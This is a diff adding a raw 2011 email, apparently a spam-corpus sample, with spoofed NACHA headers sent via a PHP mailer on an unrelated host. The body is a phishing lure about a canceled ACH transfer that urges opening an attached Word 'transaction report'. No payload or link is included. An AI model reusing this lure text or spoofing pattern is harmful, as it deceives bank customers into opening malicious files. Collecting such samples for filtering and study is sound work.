@@ -1,0 +1,20 @@
+Received: from apache by pdpbdarbgchaipji.atainvest.com with local (Exim 4.67)
+	(envelope-from <principalitieszt67@alumni.insead.edu>)
+	id HARLTL-EGA3DV-30
+	for <k2pts@phigita.net>; Mon, 21 Nov 2011 11:41:57 +0100 
+To: <k2pts@phigita.net> 
+Subject: Your ACH transfer 
+X-PHP-Script: pdpbdarbgchaipji.ataonline.com.tr/sendmail.php for 178.36.148.186 
+From: "The Electronic Payments Association" <alert@nacha.org> 
+X-Sender: "The Electronic Payments Association" <alert@nacha.org> 
+X-Mailer: PHP 
+X-Priority: 1 
+Message-Id: <54KKRT-LNDIZV-2G@pdpbdarbgchaipji.stertil.de> 
+Date: Mon, 21 Nov 2011 11:41:57 +0100 
+--------------------------------------
+The ACH  transfer (ID: 7612977974960), recently  sent from your  checking account (by you or any other person), was  canceled by the  other financial institution.       Canceled transaction  
+      Transaction ID:     7612977974960  
+      Reason of rejection    See details in the report below   
+      Transaction Report     report_7612977974960.doc (Microsoft Word Document)   
+  13450 Sunrise Valley Drive, Suite 100Herndon, VA 201712011 NACHA - The Electronic Payments Association
+Whoops!  What is a 'image/gif'?
